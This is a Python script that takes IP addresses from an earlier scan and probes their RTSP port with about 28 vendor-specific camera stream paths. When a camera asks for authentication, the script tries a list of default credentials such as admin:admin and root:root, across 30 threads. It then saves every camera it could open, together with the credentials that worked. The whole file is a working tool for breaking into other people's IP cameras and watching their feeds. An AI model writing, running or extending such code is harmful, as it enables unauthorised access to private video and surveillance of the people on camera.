"""Full RTSP probe - try all common paths on RTSP endpoints, find live streams."""
import csv
import os
import time
import json
import re
import socket
import base64
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

import glob

CSV_PATH = None
for f in glob.glob(r'C:\Users\eli6-admin\Documents\**/controllable_Webcams.csv', recursive=True):
    CSV_PATH = f
    break
if not CSV_PATH:
    print('CSV not found')
    exit(1)
print(f'CSV: {CSV_PATH}')

# Try common paths in order of popularity
PATHS = [
    ('/', 'default'),
    ('/live', 'live'),
    ('/live.sdp', 'live.sdp'),
    ('/live/0/main', 'uniview-main'),
    ('/live/0/sub', 'uniview-sub'),
    ('/av0_0', 'uniview-av0_0'),
    ('/av0_1', 'uniview-av0_1'),
    ('/video', 'video'),
    ('/video1', 'video1'),
    ('/mpeg4', 'mpeg4'),
    ('/h264', 'h264'),
    ('/h264/ch1/main/av_stream', 'hisilicon-main'),
    ('/h264/ch1/sub/av_stream', 'hisilicon-sub'),
    ('/ch0_0', 'hisilicon-ch0_0'),
    ('/ch0_1', 'hisilicon-ch0_1'),
    ('/11', 'hipcam-main'),
    ('/12', 'hipcam-sub'),
    ('/onvif/streaming/channels/101', 'sony-onvif'),
    ('/Streaming/tracks/101', 'hikvision-track101'),
    ('/Streaming/Channels/101', 'dahua-channel101'),
    ('/Streaming/tracks/102', 'hikvision-track102'),
    ('/cam/realmonitor', 'dahua-realmonitor'),
    ('/trackID=1', 'geovision'),
    ('/PSIA/Streaming/channels/101', 'psia'),
    ('/stream1', 'stream1'),
    ('/stream2', 'stream2'),
    ('/0/usrnm:pwd/0', 'airlive'),
    ('/1/usrnm:pwd/1', 'airlive-1'),
]

CREDENTIALS = [
    '',  # No auth
    'admin:admin',
    'admin:12345',
    'admin:password',
    'admin:',
    'root:root',
    'user:user',
    'admin:1234',
    'admin:1111111',
    'admin:system',
]


def try_rtsp(host, port, path, creds, timeout=4):
    """Try RTSP DESCRIBE for one path with one set of creds."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        url = f'rtsp://{creds}@{host}:{port}{path}' if creds else f'rtsp://{host}:{port}{path}'
        req = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        s.send(req.encode())
        data = s.recv(2048)
        s.close()
        if b'200 OK' in data and b'SDP' in data.upper() or b'm=video' in data or b'RTSP/1.0 200' in data:
            return ('200', data.decode('utf-8', errors='replace')[:500])
        if b'401' in data and creds:
            # Auth required - try with Basic auth
            s2 = socket.create_connection((host, port), timeout=timeout)
            s2.settimeout(timeout)
            # Parse realm
            realm = ''
            www_auth = data.split(b'\r\nWWW-Authenticate: ')[1].split(b'\r\n')[0] if b'WWW-Authenticate:' in data else b''
            r_m = re.search(rb'realm="([^"]+)"', www_auth)
            if r_m:
                realm = r_m.group(1).decode()
            user, pwd = creds.split(':') if ':' in creds else (creds, '')
            # Basic auth
            basic = base64.b64encode(f'{user}:{pwd}'.encode()).decode()
            req2 = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {basic}\r\n\r\n'
            s2.send(req2.encode())
            data2 = s2.recv(2048)
            s2.close()
            if b'200' in data2:
                return ('auth200', data2.decode('utf-8', errors='replace')[:500])
            return ('401', data.decode('utf-8', errors='replace')[:200])
        if b'404' in data:
            return ('404', data.decode('utf-8', errors='replace')[:200])
        if b'503' in data:
            return ('503', data.decode('utf-8', errors='replace')[:200])
        if b'500' in data:
            return ('500', data.decode('utf-8', errors='replace')[:200])
        return ('other', data.decode('utf-8', errors='replace')[:200])
    except Exception as e:
        return ('err', str(e)[:50])


def main():
    csv.field_size_limit(2**31 - 1)
    existing = set()
    with open(CSV_PATH, 'r', encoding='utf-8', errors='replace') as f:
        for row in csv.DictReader(f):
            if row.get('url'):
                existing.add(row['url'])
    print(f'  CSV has {len(existing):,} URLs')

    # Load RTSP endpoints from previous scan
    if not os.path.exists('rtsp_endpoints.jsonl'):
        print('  No rtsp_endpoints.jsonl found, need to run rtsp_scan2.py first')
        return

    rtsp_ips = []
    with open('rtsp_endpoints.jsonl', 'r') as f:
        for line in f:
            r = json.loads(line)
            rtsp_ips.append(r[0])
    print(f'  Found {len(rtsp_ips)} RTSP endpoints from prior scan')

    # Try each IP × path × creds
    print(f'\n[RTSP Probe] Trying {len(rtsp_ips)} IPs × {len(PATHS)} paths × {len(CREDENTIALS)} creds')
    found = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        def probe(ip):
            for path, pname in PATHS:
                # Try no-auth first
                status, body = try_rtsp(ip, 554, path, '', timeout=3)
                if status in ('200', 'auth200'):
                    return (ip, path, pname, '', status, body)
                if status == '401':
                    # Try with creds
                    for creds in CREDENTIALS[1:]:  # skip empty
                        status2, body2 = try_rtsp(ip, 554, path, creds, timeout=3)
                        if status2 in ('200', 'auth200'):
                            return (ip, path, pname, creds, status2, body2)
                        time.sleep(0.05)
            return None
        futs = {ex.submit(probe, ip): ip for ip in list(rtsp_ips)[:1000]}
        n_done = 0
        for f in as_completed(futs):
            try:
                r = f.result(timeout=60)
                if r:
                    found.append(r)
            except Exception:
                pass
            n_done += 1
            if n_done % 20 == 0:
                print(f'  {n_done}/{min(1000, len(rtsp_ips))} probed, {len(found)} found', flush=True)

    print(f'\n  Found: {len(found)} RTSP streams')
    for ip, path, pname, creds, status, body in found[:30]:
        cdisp = creds if creds else '<no-auth>'
        print(f'  {ip}{path} [{pname}] creds={cdisp} status={status}')

    # Save results
    with open('rtsp_full_results.json', 'w', encoding='utf-8') as f:
        json.dump(found, f, indent=2, ensure_ascii=False)
    print(f'\nSaved to rtsp_full_results.json')


if __name__ == '__main__':
    main()
